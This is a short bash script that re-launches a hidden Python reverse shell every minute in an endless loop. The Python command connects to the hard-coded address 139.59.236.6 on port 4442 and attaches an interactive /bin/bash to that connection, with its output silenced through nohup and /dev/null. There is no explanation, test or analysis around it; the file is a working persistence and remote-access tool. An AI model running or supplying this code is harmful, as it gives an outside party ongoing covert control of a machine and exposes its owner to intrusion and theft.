#!/bin/bash

while true; do
  nohup python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("139.59.236.6",4442));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' >/dev/null 2>&1
  sleep 60
done
